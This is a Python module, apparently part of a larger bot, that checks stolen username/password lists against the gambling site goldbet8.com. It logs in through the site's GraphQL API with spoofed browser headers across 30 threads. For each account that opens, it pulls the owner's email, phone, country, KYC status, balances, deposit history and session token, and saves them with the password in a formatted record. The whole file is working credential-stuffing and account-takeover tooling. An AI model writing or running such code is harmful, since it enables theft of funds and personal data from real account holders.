from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json

class Goldbet8Checker(BaseChecker):
    """GoldBet8 site checker"""
    
    LOGIN_URL = "https://goldbet8.com/graphql"
    USER_URL = "https://goldbet8.com/graphql"
    
    def get_threads(self) -> int:
        return 30
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        try:
            session = requests.Session()
            
            # 1. طلب تسجيل الدخول
            login_payload = {
                "operationName": "Login",
                "variables": {
                    "input": {
                        "password": password,
                        "username": username
                    }
                },
                "query": "mutation Login($input: LoginInput!) {\n  login(input: $input) {\n    ... on LoginResponseSuccess {\n      token\n      __typename\n    }\n    ... on LoginResponseError {\n      code\n      description\n      __typename\n    }\n    __typename\n  }\n}"
            }
            
            login_headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'Content-Type': "application/json",
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'apollo-require-preflight': "true",
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': '"Android"',
                'origin': "https://goldbet8.com",
                'referer': "https://goldbet8.com/?modal=auth&mode=sign-in&currency=EUR&method=email",
                'accept-language': "en-US,en;q=0.9",
            }
            
            params = {'op': "Login"}
            
            login_response = session.post(
                self.LOGIN_URL,
                params=params,
                json=login_payload,
                headers=login_headers,
                timeout=20
            )
            
            if login_response.status_code != 200:
                return {"status": "bad", "username": username}
            
            login_data = login_response.json()
            
            # التحقق من نتيجة تسجيل الدخول
            login_result = login_data.get("data", {}).get("login", {})
            
            if login_result.get("__typename") == "LoginResponseError":
                return {"status": "bad", "username": username}
            
            if login_result.get("__typename") != "LoginResponseSuccess":
                return {"status": "bad", "username": username}
            
            # استخراج التوكن
            token = login_result.get("token", "")
            if not token:
                return {"status": "error", "username": username}
            
            # 2. الحصول على معلومات المستخدم
            user_payload = {
                "operationName": "CurrentUser",
                "variables": {},
                "query": "query CurrentUser {\n  currentUser {\n    ...CurrentUser\n    ... on GeneralAppError {\n      code\n      message\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment CurrentUser on User {\n  id\n  email\n  emailConfirmed\n  name\n  phoneConfirmed\n  phone\n  gameBalanceId\n  mainCountry\n  firstRegisteredCurrency\n  kyc\n  onboarding\n  isKycRequired\n  depositBonusClaimShown\n  referralQuestsCompleted\n  isReferralBanned\n  oneClickRequisitesShown\n  level\n  balance {\n    ...UserBalance\n    __typename\n  }\n  language\n  hideZeroBalances\n  hideLevelUp\n  showOneTimeLevelUpModal\n  totalWager\n  createdAt\n  uuid\n  isVip\n  isBouncedEmail\n  registrationType\n  successDepositCount\n  successDepositAmount\n  __typename\n}\n\nfragment UserBalance on UserBalance {\n  id\n  bonus\n  real\n  total\n  currency {\n    code\n    __typename\n  }\n  __typename\n}"
            }
            
            user_headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                'Content-Type': "application/json",
                'apollo-require-preflight': "true",
                'authorization': f"Bearer {token}",
                'origin': "https://goldbet8.com",
                'referer': "https://goldbet8.com/profile/dashboard",
                'accept-language': "en-US,en;q=0.9",
            }
            
            user_params = {'op': "CurrentUser"}
            
            user_response = session.post(
                self.USER_URL,
                params=user_params,
                json=user_payload,
                headers=user_headers,
                timeout=15
            )
            
            user_info = {}
            if user_response.status_code == 200:
                user_data = user_response.json()
                user_info = user_data.get("data", {}).get("currentUser", {})
            
            # استخراج معلومات الرصيد
            balance_info = {}
            if user_info and "balance" in user_info and len(user_info["balance"]) > 0:
                balance_info = user_info["balance"][0]
            
            real_balance = float(balance_info.get("real", 0))
            bonus_balance = float(balance_info.get("bonus", 0))
            total_balance = float(balance_info.get("total", 0))
            currency = balance_info.get("currency", {}).get("code", "EUR")
            
            # تجميع بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "user_id": user_info.get("id", ""),
                "email": user_info.get("email", ""),
                "name": user_info.get("name", ""),
                "phone": user_info.get("phone", ""),
                "country": user_info.get("mainCountry", ""),
                "currency": currency,
                "kyc_status": user_info.get("kyc", False),
                "email_confirmed": user_info.get("emailConfirmed", False),
                "phone_confirmed": user_info.get("phoneConfirmed", False),
                "level": user_info.get("level", 0),
                "is_vip": user_info.get("isVip", False),
                "registration_type": user_info.get("registrationType", ""),
                "created_at": user_info.get("createdAt", ""),
                "deposit_count": user_info.get("successDepositCount", 0),
                "deposit_amount": float(user_info.get("successDepositAmount", 0)),
                "total_wager": user_info.get("totalWager", 0),
                "balances": {
                    "real": real_balance,
                    "bonus": bonus_balance,
                    "total": total_balance
                },
                "has_deposited": user_info.get("successDepositCount", 0) > 0,
                "token": token
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب - جميع الحسابات الصحيحة"""
        return True  # نحفظ جميع الحسابات الصحيحة
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب مع جميع المعلومات المهمة"""
        return (
            f"🔐 GOLDBET8 ACCOUNT\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Username: {account_data['login']}\n"
            f"🔑 Password: {account_data['password']}\n"
            f"📧 Email: {account_data['email']}\n"
            f"📱 Phone: {account_data['phone']}\n"
            f"🌍 Country: {account_data['country']}\n"
            f"💰 Balance: {account_data['balances']['total']} {account_data['currency']}\n"
            f"   ├─ Real: {account_data['balances']['real']} {account_data['currency']}\n"
            f"   └─ Bonus: {account_data['balances']['bonus']} {account_data['currency']}\n"
            f"🔒 KYC Status: {'✅ Verified' if account_data['kyc_status'] else '❌ Not Verified'}\n"
            f"📊 Level: {account_data['level']}\n"
            f"👑 VIP: {'✅ Yes' if account_data['is_vip'] else '❌ No'}\n"
            f"💳 Deposits: {account_data['deposit_count']} times\n"
            f"💵 Deposit Amount: {account_data['deposit_amount']} {account_data['currency']}\n"
            f"🎲 Total Wager: {account_data['total_wager']}\n"
            f"📝 Registration Type: {account_data['registration_type']}\n"
            f"📅 Created: {account_data['created_at'][:10] if account_data['created_at'] else 'Unknown'}\n"
            f"🆔 User ID: {account_data['user_id']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        )
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"💾 Saved: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }
